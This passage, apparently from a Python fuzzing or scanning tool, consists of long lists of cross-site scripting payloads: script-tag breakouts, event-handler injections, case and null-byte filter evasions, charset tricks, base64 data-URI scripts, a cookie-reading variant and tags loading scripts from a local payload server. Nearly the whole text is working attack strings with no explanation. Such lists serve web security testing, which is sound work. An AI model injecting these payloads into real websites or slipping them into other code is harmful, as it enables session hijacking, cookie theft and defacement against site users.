             '<math><a xlink:href="//jsfiddle.net/t846h/">click', '<svg><script>alert&#40/1/&#41</script>',
             '<svg><script>alert&#40      1&#41 ', '&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;',
             '<a  href="j&#x26;#x26#x41;vascript:alert%252831337%2529">Hello</a>', '<input value="XSStest" type=text>',
             '"><imgsrc=x  onerror=prompt(0);>', '" autofocusonfocus=alert(1)', '" onmouseover="prompt(0) x="',
             '" onfocusin=alert(1)     autofocus x="', '" onfocusout=alert(1)     autofocus x="',
             '" onblur=alert(1) autofocus     a="', '";alert(1) ',
             '";document.body.addEventListener("DOMActivate",alert(1))',
             '";document.body.addEventListener("DOMActivate",prompt(1))',
             '";document.body.addEventListener("DOMActivate",confirm(1))',
             '<a href=\xe2\x80\x9dUserinput\xe2\x80\x9d>Click</a>',
             '<a href=\xe2\x80\x9djavascript:alert(1)//\xe2\x80\x9d>Click</a>', 'javascript&#058;alert(1)',
             'javaSCRIPT&colon;alert(1)', 'JaVaScRipT:alert(1)', 'javas&Tab;cript:\\u0061lert(1);',
             'javascript:\\u0061lert&#x28;1&#x29', 'avascript&#x3A;alert&lpar;document&period;cookie&rpar;',
             'vbscript:alert(1);', 'vbscript&#058;alert(1);', 'vbscr&Tab;ipt:alert(1)"',
             'encodeURIComponent(&#039;userinput&#039;)', '-alert(1)-', '-prompt(1)-', '-confirm(1)-',
             'encodeURIComponent(&#039;&#039;-alert(1)-&#039;&#039;)',
             'encodeURIComponent(&#039;&#039;-prompt(1)-&#039;&#039;)',
             '<svg><script>varmyvar=\xe2\x80\x9dYourInput\xe2\x80\x9d;</script></svg>',
             'www.site.com/test.php?var=text\xe2\x80\x9d;alert(1)//',
             '<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>', 'src=x onerror=prompt(0);',
             '???script?alert(1)?/script?', '<scri%00pt>alert(1);</scri%00pt>', '<scri\\x00pt>alert(1);</scri%00pt>',
             '<s%00c%00r%00%00ip%00t>confirm(0);</s%00c%00r%00%00ip%00t>', '<script>alert(1);</script>',
             '<%0ascript>alert(1);</script>', '<%0bscript>alert(1);</script>',
             '<//     style=x:expression\\28write(1)\\29>', '<!--[if]><script>alert(1)</script     -->',
             '<?xml-stylesheet     type="text/css"?><root     style="x:expression(write(1))"/>',
             '<%div%20style=xss:expression(prompt(1))>',
             '<a/onmouseover[\\x0b]=location=&#039;\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B&#039;>rhainfosec',
             '<iframesrc=&#039;http://www.target.com?foo="xss  autofocus/AAAAA  onfocus=location=window.name//&#039;',
             'name="javascript:alert("XSS")"></iframe>', '<script> vari=location.hash; document.write(i); </script>',
             '<svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]//#:()',
             '<scri%00pt>confirm(0);</scri%00pt>',
             '<a/onmouseover[\\x0b]=location=&#039;\\x6A\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x3A\\x61\\x6C\\x65\\x72\\x74\\x28\\x30\\x29\\x3B&#039;>rhainfosec',
             '<isindex action=j&Tab;a&Tab;vas&Tab;c&Tab;r&Tab;ipt:alert(1) type=image>', '<marquee/onstart=confirm(2)>',
             '<table background="javascript:alert(1)"></table> ', '"/><marquee  onfinish=confirm(123)>a</marquee>',
             '<svg/onload=prompt(1);> ', '<isindex action="javas&tab;cript:alert(1)" type=image>',
             '<marquee/onstart=confirm(2)>', '', '', '', '']
payload_4 = ['?><script>alert(?X?)</script>', '?><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             "' '><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             '<script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             '" onerror=alert(1) "', '" onerror=alert(1) x="', '-alert(1)-', '-prompt(1)-',
             '<marquee/onstart=confirm(1)>', '"><marquee/onstart=confirm(1)>', "'><marquee/onstart=confirm(1)>",
             '<img src=x onerror=prompt(1);>', '"><img src=x onerror=prompt(1);>', "'><img src=x onerror=prompt(1);>",
             '<img src=x onerror=prompt(1)>', '"><img src=x onerror=prompt(1)>', "'><img src=x onerror=prompt(1)>",
             '\'\';!--"<X>=&{()}', '<SCRIPT>+alert("X");</SCRIPT>', '</ScrIpt><SCRIPT>+alert("X");</SCRIPT>',
             '"><SCRIPT>+alert("X");</SCRIPT>', '</ScrIpt><SCRIPT>+alert("X");</SCRIPT>',
             '\'><SCRIPT>+alert("X");</SCRIPT>', '</ScrIpt><SCRIPT>+alert("X");</SCRIPT>',
             '<SCRIPT>+alert("X")</SCRIPT>', '</ScrIpt><SCRIPT>+alert("X")</SCRIPT>', '"><SCRIPT>+alert("X")</SCRIPT>',
             '</ScrIpt><SCRIPT>+alert("X")</SCRIPT>', '\'><SCRIPT>+alert("X")</SCRIPT>',
             '</ScrIpt><SCRIPT>+alert("X")</SCRIPT>', '<script>alert(/X/)</script>',
             '</ScrIpt><script>alert(/X/)</script>', '"><script>alert(/X/)</script>',
             '</ScrIpt><script>alert(/X/)</script>', "'><script>alert(/X/)</script>",
             '</ScrIpt><script>alert(/X/)</script>', '<svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>',
             '"><svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>',
             '\'><svg><script>varmyvar="text&quot;;alert(1)//";</script></svg>',
             '<object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>',
             '"><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>',
             '\'><object type="text/x-scriptlet" data="http://jsfiddle.net/XLE63/ "></object>',
             '<math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click',
             '"><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click',
             '\'><math><a xlink:href="//127.0.0.1:3555/xss_serve_payloads/X.js">click',
             '<embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>',
             '"><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>',
             '\'><embed code="http://127.0.0.1:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>',
             '<script itworksinallbrowsers>/*<script* */alert(1)</script',
             '"><script itworksinallbrowsers>/*<script* */alert(1)</script',
             "'><script itworksinallbrowsers>/*<script* */alert(1)</script",
             '<img src ?itworksonchrome?\\/onerror = alert(1)', '"><img src ?itworksonchrome?\\/onerror = alert(1)',
             "'><img src ?itworksonchrome?\\/onerror = alert(1)", '<script crossorigin>alert(1);</script>',
             '"><script crossorigin>alert(1);</script>', "'><script crossorigin>alert(1);</script>",
             '<script async>alert(1);</script async>', '"><script async>alert(1);</script async>',
             "'><script async>alert(1);</script async>", '<script charset>alert(1);</script charset>',
             '"><script charset>alert(1);</script charset>', "'><script charset>alert(1);</script charset>",
             '<script a b c >alert(1)</script d e f>', '"><script a b c >alert(1)</script d e f>',
             "'><script a b c >alert(1)</script d e f>",
             '<img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>',
             '"><img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>',
             '\'><img src=x onerror=document.body.innerHTML=location.hash>#"><img src=x onerror=prompt(1)>',
             '"><img src=x onerror=prompt(1)>', "'><img src=x onerror=prompt(1)>",
             '<img src=x onerror=document.body.innerHTML=location.hash>#"><img/src=\'x\'onerror=prompt(1)>',
             '"><img src=x onerror=document.body.innerHTML=location.hash>#"><img/src=\'x\'onerror=prompt(1)>',
             '\'><img src=x onerror=document.body.innerHTML=location.hash>#"><img/src=\'x\'onerror=prompt(1)>',
             '<img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>',
             '"><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>',
             "'><img src=x onerror=document.body.innerHTML=location.hash>#<img src=x onerror=prompt(1)>",
             '"><img src=x onerror=prompt(1)>', "'><img src=x onerror=prompt(1)>",
             "<img src=x onerror=document.body.innerHTML=location.hash>#<img/src='x'onerror=prompt(1)>",
             '"><img src=x onerror=document.body.innerHTML=location.hash>#<img/src=\'x\'onerror=prompt(1)>',
             "'><img src=x onerror=document.body.innerHTML=location.hash>#<img/src='x'onerror=prompt(1)>",
             '<svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>',
             '"><svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>',
             "'><svg onload=document.body.innerHTML=location.hash>#<img src=x onerror=alert(1)>",
             "<svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>",
             '"><svg onload=document.body.innerHTML=location.hash>#<img src=\'x\'onerror=alert(1)>',
             "'><svg onload=document.body.innerHTML=location.hash>#<img src='x'onerror=alert(1)>",
             '<svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>',
             '"><svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>',
             "'><svg onload=document.body.innerHTML=location.hash>#<svg onload=prompt(1)>",
             '<svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>',
             '"><svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>',
             "'><svg onload=document.body.innerHTML=location.hash>#<svg/onload=prompt(1)>", '--!><svg onload=prompt(1)',
             'eval(((_=!1)+{})[1]+(_+{})[2]+(_+{})[4]+((_=!!1)+{})[1]+(_+{})[0]+((_=>(_))+1)[3]+1+((_=>(_))+1)[5])',
             'eval((_=!0+(()=>0)+!1)[10]+_[11]+_[3]+_[1]+_[0]+_[4]+1+_[5])', '<marquee>alert( `X :)`)</marquee>',
             '"><marquee>alert( `X :)`)</marquee>', "'><marquee>alert( `X :)`)</marquee>",
             '<"script">"alert(0)"</"script">', '"><"script">"alert(0)"</"script">',
             '\'><"script">"alert(0)"</"script">', "<s[NULL]cript>alert(1)</s[NULL]cript>'>X</a>",
             '"><s[NULL]cript>alert(1)</s[NULL]cript>\'>X</a>', "'><s[NULL]cript>alert(1)</s[NULL]cript>'>X</a>",
             '<video><source o?UTF-8?Q?n?error="alert(1)">', '"><video><source o?UTF-8?Q?n?error="alert(1)">',
             '\'><video><source o?UTF-8?Q?n?error="alert(1)">',
             '<body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
             '"><body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>',
             "'><body scroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>",
             '<meta charset="x-mac-farsi">??script ??alert(1)//??/script ??',
             '"><meta charset="x-mac-farsi">??script ??alert(1)//??/script ??',
             '\'><meta charset="x-mac-farsi">??script ??alert(1)//??/script ??', "<x onload'=alert(1)",
             '"><x onload\'=alert(1)', "'><x onload'=alert(1)", "<sc'+'ript>alert(1)</script>",
             '"><sc\'+\'ript>alert(1)</script>', "'><sc'+'ript>alert(1)</script>",
             '<FRAMESET><FRAME RC=""+"javascript:alert(\'X\');"></FRAMESET>',
             '"><FRAMESET><FRAME RC=""+"javascript:alert(\'X\');"></FRAMESET>',
             '\'><FRAMESET><FRAME RC=""+"javascript:alert(\'X\');"></FRAMESET>',
             '</script>"//\'//<svg%0Aonload=alert(1)//>', '"></script>"//\'//<svg%0Aonload=alert(1)//>',
             '\'></script>"//\'//<svg%0Aonload=alert(1)//>', '\'//</script><svg%20"%0aonload=alert(1)%20//>',
             '</script>\'//<svg "%0Aonload=alert(1) //>', '"></script>\'//<svg "%0Aonload=alert(1) //>',
             '\'></script>\'//<svg "%0Aonload=alert(1) //>', '\'//</script><svg "%0Aonload=alert(1)// />',
             '</script>"//\'//<svg%0Aonload=alert(1) //>', '"></script>"//\'//<svg%0Aonload=alert(1) //>',
             '\'></script>"//\'//<svg%0Aonload=alert(1) //>', '</script>\'//<svg "%0Aonload=alert(1)// />',
             '"></script>\'//<svg "%0Aonload=alert(1)// />', '\'></script>\'//<svg "%0Aonload=alert(1)// />',
             '</script "//\'//><svg%0Aonload=alert(1)//>', '"></script "//\'//><svg%0Aonload=alert(1)//>',
             '\'></script "//\'//><svg%0Aonload=alert(1)//>', '\';//</script><svg ";%0Aonload=alert(1)// />#',
             '</script><img src \'//"%0Aonerror=alert(1)//', '"></script><img src \'//"%0Aonerror=alert(1)//',
             '\'></script><img src \'//"%0Aonerror=alert(1)//', '</script><svg onload=\'-/"/-[alert(1)]//\'/>',
             '"></script><svg onload=\'-/"/-[alert(1)]//\'/>', '\'></script><svg onload=\'-/"/-[alert(1)]//\'/>',
             '</script><img \'//"%0Aonerror=alert(1)// src>', '"></script><img \'//"%0Aonerror=alert(1)// src>',
             '\'></script><img \'//"%0Aonerror=alert(1)// src>', '</script><img \'//"%0Aonerror=alert(1)// src=1>',
             '"></script><img \'//"%0Aonerror=alert(1)// src=1>', '\'></script><img \'//"%0Aonerror=alert(1)// src=1>',
             '</script "/*\'/*><svg */; onload=alert(1) //>', '"></script "/*\'/*><svg */; onload=alert(1) //>',
             '\'></script "/*\'/*><svg */; onload=alert(1) //>', '</script><script>/*"/*\'/**/;alert(1)//</script>#',
             '"></script><script>/*"/*\'/**/;alert(1)//</script>#',
             '\'></script><script>/*"/*\'/**/;alert(1)//</script>#',
             '</script "/*\'/*><img/src=x */; onerror=alert(1) //',
             '"></script "/*\'/*><img/src=x */; onerror=alert(1) //',
             '\'></script "/*\'/*><img/src=x */; onerror=alert(1) //',
             '</script><script>/*var a="/*""\'/**/;alert(1);//</script>',
             '"></script><script>/*var a="/*""\'/**/;alert(1);//</script>',
             '\'></script><script>/*var a="/*""\'/**/;alert(1);//</script>',
             '<iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">',
             '"><iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">',
             '\'><iframe src="data:data:javascript:,% 3 c script % 3 e confirm(1) % 3 c/script %3 e">',
             "' style='width:expression(prompt(1));", '"width:expression(prompt(1))',
             'width:\\0065\\0078\\0070\\0072\\0065\\0073\\0073\\0069\\006F\\006E\\0028\\0070\\0072\\006F\\006D\\0070\\0074\\0028\\0031\\0029\\0029',
             'javascript:prompt(1)', 'javascript:\\u0070rompt&#x28;1&#x29;', 'jAvAsCrIpT&colon;prompt&lpar;1&rpar;',
             'http://jsfiddle.net/xboz/c7vvkedv/',
             '<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
             '"><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
             '\'><EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>',
             '<DIV STYLE="width:\\0065\\0078\\0070\\0072\\0065\\0073\\0073\\0069\\006F\\006E\\0028\\0070\\0072\\006F\\006D\\0070\\0074\\0028\\0031\\0029\\0029">',
             '"><DIV STYLE="width:\\0065\\0078\\0070\\0072\\0065\\0073\\0073\\0069\\006F\\006E\\0028\\0070\\0072\\006F\\006D\\0070\\0074\\0028\\0031\\0029\\0029">',
             '\'><DIV STYLE="width:\\0065\\0078\\0070\\0072\\0065\\0073\\0073\\0069\\006F\\006E\\0028\\0070\\0072\\006F\\006D\\0070\\0074\\0028\\0031\\0029\\0029">',
             'data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=',
             'data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+cHJvbXB0KDEpOzwvc2NyaXB0Pjwvc3ZnPg==',
             'data:text/html;base64,PHNjcmlwdD5wcm9tcHQoMSk8L3NjcmlwdD4=',
             'data:text/html;,&#60&#115&#99&#114&#105&#112&#116&#62&#112&#114&#111&#109&#112&#116&#40&#49&#41&#60&#47&#115&#99&#114&#105&#112&#116&#62',
             '``onerror=prompt(1)', 'alert(/XSS/);', '1;alert(/XSS/);', "1';alert(/XSS/);x='1", "';alert(/XSS/);'",
             '<svg><script>prompt&#40 1&#41</script>', '"><svg><script>prompt&#40 1&#41</script>',
             "'><svg><script>prompt&#40 1&#41</script>",
             '<html> <script> var a="</script><script>alert(1)//";</script> </html>',
             '"><html> <script> var a="</script><script>alert(1)//";</script> </html>',
             '\'><html> <script> var a="</script><script>alert(1)//";</script> </html>',
             '&#34;><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', '"><script>alert(1)</script>',
             '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             "'';}}</script><script>alert(1)</script>", '</ScrIpt><script>alert(1)</script>',
             '"><script>alert(1)</script>', '</ScrIpt><script>alert(1)</script>', "'><script>alert(1)</script>",
             '</ScrIpt><script>alert(1)</script>', '<body onpageshow=alert(1)>', '"><body onpageshow=alert(1)>',
             "'><body onpageshow=alert(1)>", '<body onpageshow=alert(1);>', '"><body onpageshow=alert(1);>',
             "'><body onpageshow=alert(1);>", '<body/onpageshow=alert(1)>', '"><body/onpageshow=alert(1)>',
             "'><body/onpageshow=alert(1)>", '<body/onpageshow=alert(1);>', '"><body/onpageshow=alert(1);>',
             "'><body/onpageshow=alert(1);>", '"><b/onclick="javascript:window.window.window[\'alert\'](1)">bold',
             "<body language=vbs onload=window.location='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='>",
             '"><body language=vbs onload=window.location=\'data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==\'>',
             "'><body language=vbs onload=window.location='data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg=='>",
             'behaviour:url\\0028javascript:alert\\0028[0][0]\\0029\\0029', '<iframe src="javascript:x:alert(1)">',
             '"><iframe src="javascript:x:alert(1)">', '\'><iframe src="javascript:x:alert(1)">',
             '<a href="javascript:x:alert(1)">x</a>', '"><a href="javascript:x:alert(1)">x</a>',
             '\'><a href="javascript:x:alert(1)">x</a>', '<a href=j&#x00000000041vascr&#x00000000069pt:alert(1)>X</a>',
             '"><a href=j&#x00000000041vascr&#x00000000069pt:alert(1)>X</a>',
             "'><a href=j&#x00000000041vascr&#x00000000069pt:alert(1)>X</a>",
             '<div contextmenu=x>right-click<menu id=x onshow=alert(1)>',
             '"><div contextmenu=x>right-click<menu id=x onshow=alert(1)>',
             "'><div contextmenu=x>right-click<menu id=x onshow=alert(1)>",
             '";document.body.addEventListener("DOMActivate",alert(1))//', '/*@cc_on @if(1)alert(1)@end',
             'var a=0; ((a == 1) ? 2 : alert(1));//',
             '(0)[\'constructor\'][\'constructor\']("\\141\\154\\145\\162\\164(1)")();', '<input oninput=alert(1)>',
             '"><input oninput=alert(1)>', "'><input oninput=alert(1)>",
             '<video onprogress=alert(1)><source src=//a.a>', '"><video onprogress=alert(1)><source src=//a.a>',
             "'><video onprogress=alert(1)><source src=//a.a>", '<video onprogress=alert(1)><source src=x>',
             '"><video onprogress=alert(1)><source src=x>', "'><video onprogress=alert(1)><source src=x>",
             '<video/onprogress=alert(1)><source/src=//a.a>', '"><video/onprogress=alert(1)><source/src=//a.a>',
             "'><video/onprogress=alert(1)><source/src=//a.a>", '<video/onprogress=alert(1)><source/src=x>',
             '"><video/onprogress=alert(1)><source/src=x>', "'><video/onprogress=alert(1)><source/src=x>",
             '<video onprogress=alert(1)><source src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>',
             '"><video onprogress=alert(1)><source src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>',
             "'><video onprogress=alert(1)><source src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>",
             '<video/onprogress=alert(1)><source/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>',
             '"><video/onprogress=alert(1)><source/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>',
             "'><video/onprogress=alert(1)><source/src=http://127.0.0.1:3555/xss_serve_payloads/X.ogg>",
             '<svg onload=\\u0061lert(1)>', '"><svg onload=\\u0061lert(1)>', "'><svg onload=\\u0061lert(1)>",
             '<meta%20charset=HZ-GB-2312><scrip~}t>alert(1)</scrip~}t>',
             '"><meta%20charset=HZ-GB-2312><scrip~}t>alert(1)</scrip~}t>',
             "'><meta%20charset=HZ-GB-2312><scrip~}t>alert(1)</scrip~}t>",
             '<meta charset=HZ-GB-2312><scrip~}t>alert(1)</script>',
             '"><meta charset=HZ-GB-2312><scrip~}t>alert(1)</script>',
             "'><meta charset=HZ-GB-2312><scrip~}t>alert(1)</script>",
             '<meta charset=utf-7><img src=x o%2BAG4-error=alert(1)>',
             '"><meta charset=utf-7><img src=x o%2BAG4-error=alert(1)>',
             "'><meta charset=utf-7><img src=x o%2BAG4-error=alert(1)>",
             '<meta charset=Shift_JIS><script>x="?\\";alert(1)//"</script>',
             '"><meta charset=Shift_JIS><script>x="?\\";alert(1)//"</script>',
             '\'><meta charset=Shift_JIS><script>x="?\\";alert(1)//"</script>', 'this["alert"]("X")',
             "this['alert'](1)", '<script>this["alert"]("X")</script>', '</ScrIpt><script>this["alert"]("X")</script>',
             '"><script>this["alert"]("X")</script>', '</ScrIpt><script>this["alert"]("X")</script>',
             '\'><script>this["alert"]("X")</script>', '</ScrIpt><script>this["alert"]("X")</script>',
             '<svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//',
             '"><svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//',
             "'><svg/onload=t=/aler/.source+/t/.source;window.onerror=window[t];throw+1;//", '<svg\x0conload=alert(1)>',
             '"><svg\x0conload=alert(1)>', "'><svg\x0conload=alert(1)>",
             '<svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=#rectangle" />',
             '"><svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=#rectangle" />',
             '\'><svg><use xlink:href="data:image/svg+xml;base64,PHN2ZyBpZD0icmVjdGFuZ2xlIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiAgICB3aWR0aD0iMTAwIiBoZWlnaHQ9IjEwMCI+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg0KIDxmb3JlaWduT2JqZWN0IHdpZHRoPSIxMDAiIGhlaWdodD0iNTAiDQogICAgICAgICAgICAgICAgICAgcmVxdWlyZWRFeHRlbnNpb25zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCgk8ZW1iZWQgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiIHNyYz0iamF2YXNjcmlwdDphbGVydCgxKSIgLz4NCiAgICA8L2ZvcmVpZ25PYmplY3Q+DQo8L3N2Zz4=#rectangle" />',
             '"-alert(1)-"', '"/alert(1)/"', '"|alert(1)|"', '==alert(1)==', '[alert(1)]+', '^alert(1)^', '|alert(1)|',
             '&alert(1)&', '>>alert(1)>>', '<form name=self location="javascript:alert(1)"',
             '"><form name=self location="javascript:alert(1)"', '\'><form name=self location="javascript:alert(1)">',
             '"><form name=self location="javascript:alert(1)"', '"><form name=self location="javascript:alert(1)"',
             '\'><form name=self location="javascript:alert(1)">', '\'><form name=self location="javascript:alert(1)"',
             '"><form name=self location="javascript:alert(1)"', '\'><form name=self location="javascript:alert(1)">',
             '<form name=self location="javascript:alert(1)"', '"><form name=self location="javascript:alert(1)"',
             '\'><form name=self location="javascript:alert(1)"', "'|\\u0061lert()|'", '<style%0conload=alert(1)>',
             '"><style%0conload=alert(1)>', "'><style%0conload=alert(1)>",
             '<ScR<ScRiPt>IpT>prompt(1)<%2FsCr<ScRiPt>IpT>', '"><ScR<ScRiPt>IpT>prompt(1)<%2FsCr<ScRiPt>IpT>',
             "'><ScR<ScRiPt>IpT>prompt(1)<%2FsCr<ScRiPt>IpT>", '<scrip<script>t>alert(1)</script>',
             '"><scrip<script>t>alert(1)</script>', "'><scrip<script>t>alert(1)</script>",
             "javasCript:eval%28'aler'+'t'+'%28%29'%29", '&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;',
             'Data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==',
             '<img%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29>', '"><img%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29>',
             "'><img%0D%0Asrc%3Da%0D%0Aonerror%3Dalert%281%29>", '<IMG SRC="jav\tascript:alert(\'X\');">',
             '"><IMG SRC="jav\tascript:alert(\'X\');">', '\'><IMG SRC="jav\tascript:alert(\'X\');">',
             '<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("X")>',
             '"><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("X")>',
             '\'><BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("X")>', '\\";alert(\'X\');//',
             '&#x00027;; confirm(1); &#x00027;', '&#39;; confirm(1); &#39;', '%27; confirm(1); %27',
